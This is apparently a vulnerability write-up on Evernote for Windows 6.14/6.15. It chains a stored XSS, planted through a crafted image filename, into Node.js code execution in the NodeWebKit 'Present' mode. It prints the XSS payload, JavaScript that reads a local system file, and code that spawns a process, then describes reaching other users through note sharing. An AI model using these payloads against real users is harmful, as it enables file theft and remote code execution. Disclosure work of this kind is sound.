## 0x00 TL;DR
  1. A stored cross site scripting(XSS) issue was repaired before version 6.15.
  2. If a stored XSS in your note,the javascript code will executed in lastest Evernote for Windows.It mean I can create a stored XSS in version 6.14 and it will always work.
  3. `Present` mode was created by `node webkit`,I can control it by stored XSS.
  4. I successfully read "C:\Windows\win.ini" and open `calc.exe` at last.
## 0x01 A Stored XSS In Version 6.14
Thanks [@sebao](http://www.daimacn.com),He told me how he found a stored xss
in Evernote. 1\. Add a picture to your note. 2\. Right click and rename this
picture,like: `" onclick="alert(1)">.jpg` 3\. open this note and click this
picture,it will `alert(1)`
2018/09/20, Evernote for Windows 6.15 GA released and fix the issue @sebao
reported.
In Evernote for Windows 6.15, ``,`"` were filtered when insert
filename,But the note which named by `sebao_xss` can also `alert(1)`.It mean
they are do nothing when the filename output.I can use store XSS again.
## 0x02 JS Inject In NodeWebKit
Of course, I don't think this is a serious security problem.So I decided to
find other Vulnerabilities like RCE or local file read.
In version 6.14,I rename this picture as `" onclick="alert(1)">.jpg` for convenience, It allows me load the
js file from remote server. Then I installed Evernote for Windows 6.15.
I try some special api,like:
`evernote.openAttachment`,`goog.loadModuleFromUrl`,but failed.
After failing many times,I decided to browse all files under path `C:\\Program
Files(x86)\Evernote\Evernote\`.I find Evernote has a `NodeWebKit` in
`C:\\Program Files(x86)\Evernote\Evernote\NodeWebKit` and `Present mode` will
use it.
Another good news is we can execute Nodejs code by stored XSS under `Present
mode`.
## 0x03 Read Local File & Command Execute
I try to use `require('child_process').exec`,but fail: `Module name
"child_process" has not been loaded yet for context`.So I need a new way.
Very Lucky,I found this article: [How we exploited a remote code execution
vulnerability in math.js](https://capacitorset.github.io/mathjs/)
I read local file successfully.
    //read local file javascript code
    alert("Try to read C:\\\\Windows\\win.ini");
    try{
      var buffer = new Buffer(8192);
      process.binding('fs').read(process.binding('fs').open('..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini', 0, 0600), buffer, 0, 4096); 
      alert(buffer);
    }
    catch(err){
      alert(err);
    }
But in NodeWebKit environment,It don't have `Object` and `Array`(I don't know
why).So I try to use `spawn_sync`(I get `env` from `window.process.env`):
    // command executed
    try{
      spawn_sync = process.binding('spawn_sync');
      envPairs = [];
      for (var key in window.process.env) {
        envPairs.push(key + '=' + window.process.env[key]);
      }
      args = [];
      const options = {
        file: 'C:\\\\Windows\\system32\\calc.exe',
        args: args,
        envPairs: envPairs,
        stdio: [
          { type: 'pipe', readable: true, writable: false },
          { type: 'pipe', readable: false, writable: true },
          { type: 'pipe', readable: false, writable: true } 
        ]
      };
      spawn_sync.spawn(options);
    }
    catch(err){
      alert(err);
    }
## 0x04 Use Share Function
Now,I can read my computer's file and execute `calc.exe`.I need to prove that
this vulnerability can affect other people. I signed up for a new account
`*****PI:EMAIL` and shared this note with the new account.
`*****PI:EMAIL` can receive some message in `Work Chat`:
if `*****PI:EMAIL` decide to open it and use the `Present mode`,the
Nodejs code will executed.
